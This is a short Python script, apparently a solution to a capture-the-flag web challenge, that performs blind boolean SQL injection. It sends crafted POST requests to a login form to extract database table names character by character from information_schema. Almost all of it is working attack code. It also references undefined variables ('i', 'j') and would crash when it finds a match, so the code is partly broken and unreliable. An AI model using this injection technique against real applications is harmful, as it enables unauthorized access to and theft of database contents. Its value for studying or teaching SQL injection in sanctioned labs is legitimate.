#!/usr/bin/python

import httplib
import urllib

result = ""

# Finding a way around to get table information
for table_lookup in range(1,100):

        # While iterating and comparing the first character of the table name
        # with the iterating alphabet.
        # As soon as a match is given, the table information must be shown.
        for dec_alpha in range(32,128):

            headers = {'Content-Type':'application/x-www-form-urlencoded'}

            params = urllib.urlencode({"password":"') or ascii(substr((SELECT\
                                       group_concat(table_name) FROM \
                                       information_schema.tables WHERE \
                                       table_schema=database()),\
                                       "+str(table_lookup)+",1))\
                                       ="+str(dec_alpha)+" limit 0,1#","login":"1"})

            conn = httplib.HTTPConnection('basicvuln.hacking.w3challs.com')
            conn.request('POST','/index.php',params,headers)
            data = conn.getresponse().read()

            # Vulnerability found
            if 'YourShitMofo' in data:
                result=result+chr(j)
                print str(i)+' Password is '+chr(j)
                print result
                break

            print str(i)+' -> '+chr(j)

print 'Password is '+result

